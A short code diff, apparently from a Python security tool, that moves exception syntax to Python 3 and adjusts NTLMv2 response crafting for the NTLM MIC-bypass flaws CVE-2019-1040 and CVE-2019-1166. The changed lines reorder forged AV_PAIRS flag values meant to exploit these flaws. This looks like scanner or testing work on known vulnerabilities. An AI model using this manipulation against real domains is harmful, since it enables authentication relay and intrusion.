@@ -138,7 +138,7 @@ def verify_kerberos_password(user, password, domain, kdc_host=None, request_pac=
 
     try:
         tgt = sendReceive(encoder.encode(asReq), domain, kdc_host)
-    except Exception, e:
+    except Exception as e:
         if str(e).find('KDC_ERR_PREAUTH_FAILED') >= 0:
             return False
         raise
@@ -238,7 +238,8 @@ def mod_computeResponseNTLMv2(flags, serverChallenge, clientChallenge, serverNam
     if vuln == "CVE-2019-1040":
         av_pairs[NTLMSSP_AV_FLAGS] = [b'\x02' + b'\x00' * 3]
     if vuln == "CVE-2019-1166":
-        av_pairs[NTLMSSP_AV_FLAGS] = [b'\x02' + b'\x00' * 3, b'\x00' * 4]
+        #av_pairs[NTLMSSP_AV_FLAGS] = [b'\x02' + b'\x00' * 3, b'\x00' * 4]
+        av_pairs[NTLMSSP_AV_FLAGS] = [ b'\x00' * 4, b'\x02' + b'\x00' * 3]
     serverName = av_pairs.getData()
 
     temp = responseServerVersion + hiResponseServerVersion + b'\x00' * 6 + aTime + clientChallenge + b'\x00' * 4 + \
